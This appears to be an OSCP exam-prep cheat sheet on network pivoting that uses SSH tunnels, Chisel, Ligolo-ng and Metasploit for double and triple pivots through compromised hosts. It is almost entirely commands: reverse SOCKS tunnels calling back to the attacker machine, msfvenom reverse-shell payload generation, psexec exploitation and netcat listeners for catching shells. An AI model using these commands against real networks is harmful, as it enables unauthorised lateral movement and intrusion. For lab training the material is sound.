# Pivoting Advanced Scenarios Guide

## Table of Contents
1. [Pivoting Concepts](#pivoting-concepts)
2. [Double Pivoting](#double-pivoting)
3. [Triple Pivoting](#triple-pivoting)
4. [Metasploit Pivoting](#metasploit-pivoting)
5. [Ligolo-ng Advanced](#ligolo-ng-advanced)
6. [Chisel Pivoting](#chisel-pivoting)
7. [SSH Tunneling Advanced](#ssh-tunneling-advanced)
8. [OSCP Scenarios](#oscp-scenarios)

---

## Pivoting Concepts

### Network Topology Example
```
Attacker (10.10.14.5)
    ↓
DMZ Host (10.10.14.100, 172.16.1.10)
    ↓
Internal Network 1 (172.16.1.0/24)
    ↓
Pivot Host 2 (172.16.1.20, 192.168.100.10)
    ↓
Internal Network 2 (192.168.100.0/24)
    ↓
Target (192.168.100.50)
```

### Pivoting Methods
- **Port Forwarding**: Forward specific ports
- **SOCKS Proxy**: Proxy all traffic through pivot
- **VPN**: Full network access via VPN tunnel
- **Reverse Tunnels**: Tunnel from restricted network back to attacker

---

## Double Pivoting

### Scenario
```
Kali → Pivot1 (DMZ) → Pivot2 (Internal) → Target
```

### Method 1: SSH Double Pivot

#### Setup
```bash
# On Kali: Create first tunnel to Pivot1
ssh -D 1080 user@pivot1-ip

# On Pivot1: Create second tunnel to Pivot2
ssh -D 1081 user@pivot2-ip

# Configure proxychains for chained proxies
nano /etc/proxychains4.conf
```

**proxychains4.conf:**
```
[ProxyList]
socks4 127.0.0.1 1080    # Tunnel to Pivot1
socks4 127.0.0.1 1081    # Tunnel to Pivot2 (through Pivot1)
```

```bash
# Access Target through double pivot
proxychains nmap -sT -Pn target-ip
proxychains evil-winrm -i target-ip -u user -p pass
```

### Method 2: Chisel Double Pivot

#### Setup Pivot1
```bash
# On Kali: Start chisel server
./chisel server -p 8000 --reverse

# On Pivot1: Connect back and expose SOCKS
./chisel client kali-ip:8000 R:1080:socks

# Now you can access Pivot1's network via localhost:1080
```

#### Setup Pivot2 (through Pivot1)
```bash
# On Pivot1: Start chisel server
./chisel server -p 8001 --socks5

# On Kali: Create tunnel to Pivot1's chisel server
ssh -L 8001:localhost:8001 user@pivot1-ip

# On Pivot2: Connect to chisel server on Pivot1
./chisel client pivot1-ip:8001 R:1081:socks
```

```bash
# Access Target
proxychains -f proxychains-double.conf nmap -sT target-ip
```

### Method 3: Ligolo-ng Double Pivot

#### Pivot1 Setup
```bash
# On Kali: Start ligolo proxy
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On Pivot1: Start agent
./agent -connect kali-ip:11601 -ignore-cert

# In ligolo console:
session
ifconfig  # Note Pivot1's networks
start

# Add route to Pivot1's internal network
sudo ip route add 172.16.1.0/24 dev ligolo
```

#### Pivot2 Setup
```bash
# On Pivot2: Start agent connecting through Pivot1
./agent -connect pivot1-ip:11601 -ignore-cert

# In ligolo console, switch to Pivot2 session
session 1
ifconfig  # Note Pivot2's networks
start

# Add route to Pivot2's internal network
sudo ip route add 192.168.100.0/24 dev ligolo
```

```bash
# Now directly access Target
nmap -sT target-ip
evil-winrm -i target-ip -u user -p pass
```

---

## Triple Pivoting

### Scenario
```
Kali → Pivot1 (DMZ) → Pivot2 (Net1) → Pivot3 (Net2) → Target (Net3)
```

### Ligolo-ng Triple Pivot

```bash
# 1. Setup Pivot1 (as before)
# On Kali:
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On Pivot1:
./agent -connect kali-ip:11601 -ignore-cert

# Add route:
sudo ip route add 172.16.1.0/24 dev ligolo

# 2. Setup Pivot2
# On Pivot2 (through Pivot1):
./agent -connect pivot1-internal-ip:11601 -ignore-cert

# In ligolo, switch to Pivot2:
session 1
start

# Add route:
sudo ip route add 192.168.100.0/24 dev ligolo

# 3. Setup Pivot3
# On Pivot3 (through Pivot2):
./agent -connect pivot2-internal-ip:11601 -ignore-cert

# In ligolo, switch to Pivot3:
session 2
start

# Add route:
sudo ip route add 10.0.0.0/24 dev ligolo

# Now access Target directly:
nmap -sT target-ip-in-10.0.0.0
```

---

## Metasploit Pivoting

### Setup

#### Autoroute
```bash
# After getting meterpreter on Pivot1
meterpreter > run autoroute -s 172.16.1.0/24

# View routes
meterpreter > run autoroute -p

# Background session
meterpreter > background
```

#### Access Internal Network
```bash
# Use auxiliary modules through pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.1.0/24
set THREADS 10
run

# Exploit through pivot
use exploit/windows/smb/psexec
set RHOSTS 172.16.1.10
set LHOST pivot1-ip
set payload windows/meterpreter/bind_tcp
exploit
```

### SOCKS Proxy

#### Setup
```bash
# In meterpreter session
meterpreter > background

# Start SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Verify
jobs
```

#### Use with Proxychains
```bash
# Configure proxychains
nano /etc/proxychains4.conf
# Add: socks4 127.0.0.1 1080

# Use tools through pivot
proxychains nmap -sT -Pn 172.16.1.10
proxychains crackmapexec smb 172.16.1.0/24 -u user -p pass
```

### Portfwd (Port Forwarding)

```bash
# Forward specific port
meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.1.10

# Now RDP on localhost:3389 goes to internal host
xfreerdp /u:user /p:pass /v:localhost

# List forwards
meterpreter > portfwd list

# Delete forward
meterpreter > portfwd delete -l 3389
```

### Double Pivot with Metasploit

```bash
# 1. Autoroute on Pivot1
meterpreter 1 > run autoroute -s 172.16.1.0/24

# 2. Exploit Pivot2
use exploit/windows/smb/psexec
set RHOSTS 172.16.1.20
set payload windows/meterpreter/bind_tcp
exploit

# 3. Autoroute on Pivot2
meterpreter 2 > run autoroute -s 192.168.100.0/24

# 4. Now access Target network
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.50
run
```

---

## Ligolo-ng Advanced

### Multi-Network Pivoting

#### Scenario: Access Multiple Internal Networks
```bash
# Pivot1 has access to:
# - 172.16.1.0/24
# - 192.168.1.0/24

# Add both routes
sudo ip route add 172.16.1.0/24 dev ligolo
sudo ip route add 192.168.1.0/24 dev ligolo

# Access both networks directly
nmap 172.16.1.10
nmap 192.168.1.10
```

### Listener Forwarding

```bash
# In ligolo console
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# Start listener on Kali:4444
nc -nlvp 4444

# Reverse shells from internal network connect to pivot, forwarded to Kali
```

---

## Chisel Pivoting

### Reverse SOCKS Proxy

```bash
# Kali (Chisel server)
./chisel server -p 8000 --reverse

# Pivot (Chisel client)
./chisel client kali-ip:8000 R:1080:socks

# Use SOCKS proxy
proxychains nmap -sT pivot-internal-network-ip
```

### Local Port Forward

```bash
# Forward RDP (3389) from internal host to Kali
./chisel client kali-ip:8000 R:3389:172.16.1.10:3389

# RDP to localhost on Kali
xfreerdp /u:user /p:pass /v:localhost
```

### Double Pivot with Chisel

```bash
# 1. Pivot1 → Kali
# Kali:
./chisel server -p 8000 --reverse

# Pivot1:
./chisel client kali-ip:8000 R:1080:socks

# 2. Pivot2 → Pivot1 → Kali
# Pivot1 (start server):
./chisel server -p 8001 --socks5

# Kali (tunnel to Pivot1's chisel):
ssh -L 8001:localhost:8001 user@pivot1

# Pivot2:
./chisel client localhost:8001 1081:socks

# Use nested SOCKS
proxychains -f custom.conf nmap target
```

---

## SSH Tunneling Advanced

### Dynamic Port Forward (SOCKS)

```bash
# Standard SOCKS proxy
ssh -D 1080 user@pivot-ip

# With jump host
ssh -J jumphost user@final-host -D 1080
```

### Local Port Forward

```bash
# Forward port 3389
ssh -L 3389:internal-host:3389 user@pivot-ip

# Chain forwards
ssh -L 3389:172.16.1.10:3389 user@pivot1
# Then from pivot1:
ssh -L 3390:192.168.100.50:3389 user@pivot2
```

### Remote Port Forward (Reverse)

```bash
# On pivot (restricted outbound network):
ssh -R 1080 user@kali-ip

# On Kali, access pivot's network via localhost:1080
proxychains nmap -sT internal-host
```

### ProxyJump

```bash
# SSH through multiple hosts
ssh -J pivot1,pivot2,pivot3 user@target

# SCP through jump
scp -J pivot1,pivot2 file.txt user@target:/tmp/
```

---

## OSCP Scenarios

### Scenario 1: DMZ to Internal via Ligolo-ng

```bash
# 1. Setup ligolo
# Kali:
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# 2. Transfer agent to DMZ host
scp agent user@dmz-host:/tmp/

# 3. Execute agent on DMZ
ssh user@dmz-host
/tmp/agent -connect kali-ip:11601 -ignore-cert

# 4. In ligolo console
session
ifconfig  # Note: 172.16.1.10
start

# 5. Add route on Kali
sudo ip route add 172.16.1.0/24 dev ligolo

# 6. Scan internal network
nmap -sC -sV 172.16.1.20

# 7. Exploit internal host
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.10 LPORT=4444 -f exe -o payload.exe
# Upload and execute
# Catch with handler on 0.0.0.0:4444
```

### Scenario 2: Double Pivot with Chisel

```bash
# Topology: Kali → DMZ (10.10.14.100, 172.16.1.10) → Internal (172.16.1.20, 192.168.100.10) → Target (192.168.100.50)

# 1. Setup Chisel server on Kali
./chisel server -p 8000 --reverse

# 2. Connect DMZ to Kali
# On DMZ:
./chisel client kali-ip:8000 R:1080:socks

# Now access DMZ's network (172.16.1.0/24)

# 3. Compromise Internal host (172.16.1.20)
proxychains nmap -sT 172.16.1.20
# Exploit and gain shell

# 4. Setup Chisel on Internal host
# Transfer chisel to Internal
proxychains scp chisel user@172.16.1.20:/tmp/

# Start chisel server on DMZ:
./chisel server -p 9000 --socks5

# Connect Internal to DMZ:
./chisel client 172.16.1.10:9000 R:1081:socks

# 5. Access Target (192.168.100.50)
# Create proxychains config with both SOCKS
proxychains -f double.conf nmap -sT 192.168.100.50
```

### Scenario 3: Metasploit Pivot Chain

```bash
# 1. Exploit DMZ, get meterpreter
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
exploit

# 2. Add route to internal network
meterpreter > run autoroute -s 172.16.1.0/24

# 3. Scan internal network
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.1.0/24
run

# 4. Exploit internal host
use exploit/windows/smb/psexec
set RHOSTS 172.16.1.20
set payload windows/meterpreter/bind_tcp
exploit

# 5. Add route to second internal network
meterpreter > run autoroute -s 192.168.100.0/24

# 6. Access target
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.100.50
run
```

---

## Quick Reference

### Ligolo-ng
```bash
# Kali
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Pivot
./agent -connect kali-ip:11601 -ignore-cert

# Add route
sudo ip route add INTERNAL-NETWORK/24 dev ligolo
```

### Chisel
```bash
# Server
./chisel server -p 8000 --reverse

# Client (reverse SOCKS)
./chisel client server-ip:8000 R:1080:socks
```

### SSH
```bash
# Dynamic (SOCKS)
ssh -D 1080 user@pivot

# Local forward
ssh -L local-port:target:target-port user@pivot

# Remote forward
ssh -R remote-port:localhost:local-port user@pivot
```

### Metasploit
```bash
# Autoroute
run autoroute -s NETWORK/24

# SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run -j
```

---

**Remember**: Pivoting is essential for OSCP. Practice double/triple pivoting scenarios before the exam!
